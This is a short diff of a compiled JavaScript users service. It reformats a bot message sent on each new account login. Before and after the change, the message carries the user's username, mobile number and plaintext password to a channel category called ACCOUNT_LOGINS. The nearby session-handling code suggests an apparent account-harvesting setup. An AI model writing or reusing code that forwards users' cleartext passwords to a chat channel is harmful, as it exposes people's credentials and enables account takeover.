@@ -47,7 +47,7 @@ let UsersService = UsersService_1 = class UsersService {
             await this.clientsService.updateClientSession(user.session, user.mobile);
         }
         else {
-            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
+            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`, { parseMode: 'HTML' }, false);
             const newUser = new this.userModel(user);
             const saved = await newUser.save();
             setTimeout(() => {
